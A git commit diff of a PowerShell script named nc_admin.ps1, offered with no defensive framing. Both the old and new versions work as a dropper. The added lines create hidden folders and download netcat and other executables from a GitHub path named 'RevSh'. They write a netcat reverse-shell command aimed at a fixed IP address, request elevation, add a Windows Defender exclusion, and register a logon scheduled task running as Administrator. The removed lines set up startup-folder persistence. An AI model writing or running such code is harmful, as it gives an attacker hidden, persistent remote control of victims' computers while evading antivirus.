c5e6f44646ac05336372d7ac957e53463ba24711
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-02 20:53:54 -0400

    Update nc_admin.ps1

--- nc_admin.ps1
+++ nc_admin.ps1
@@ -1,27 +1,11 @@
-cmd /c "md C:\nc"
+cmd /c "md C:\nc systemctl"
 cmd /c "attrib +h C:\nc"
-(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/rh.exe","C:\nc\rh.exe")
-(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/nc.exe","C:\nc\nc.exe")
-
-
-Powershell.exe -ExecutionPolicy Bypass C:\nc\nc.ps1
-
-$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\nc\nc.lnk")
-$Shortcut.TargetPath = "C:\nc\nc.exe"
-$Shortcut.Save()
-$bytes = [System.IO.File]::ReadAllBytes("C:\nc\nc.lnk")
-$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
-[System.IO.File]::WriteAllBytes("C:\nc\nc.lnk", $bytes)
-
-$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("C:\nc\nc.bat.lnk")
-$Shortcut.TargetPath = "C:\nc\nc.bat"
-$Shortcut.Save()
-$bytes = [System.IO.File]::ReadAllBytes("C:\nc\nc.bat.lnk")
-$bytes[0x15] = $bytes[0x15] -bor 0x20 #set byte 21 (0x15) bit 6 (0x20) ON
-[System.IO.File]::WriteAllBytes("C:\nc\nc.bat.lnk", $bytes)
-
-echo move /y C:\nc\nc.bat.lnk C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\nc.bat.lnk >> C:\nc\move.bat
-
-powershell -command "Start-Process C:\nc\move.bat -Verb runas"
+cmd /c "attrib +h c:\systemctl"
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/rh.exe","C:\nc\rh.exe")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.exe","C:\nc\nc.exe")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/voice.exe","C:\nc\voice.exe")
+(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.bat","C:\nc\nc.bat")
+cmd.exe /c md C:\systemctl
+cmd.exe /c attrib +h c:\systemctl
+echo "nc.exe 64.52.163.41 8080 -e cmd.exe" >> C:\nc\nc_run.bat
+cmd.exe /c "powershell -command Start-Process C:\nc\nc.bat -Verb runas & powershell Add-MpPreference -ExclusionPath C:\systemctl & schtasks /create /sc onlogon /tn "systemctl\system tasks" /tr "c:\nc\nc.bat" /ru Administrator /rl highest"
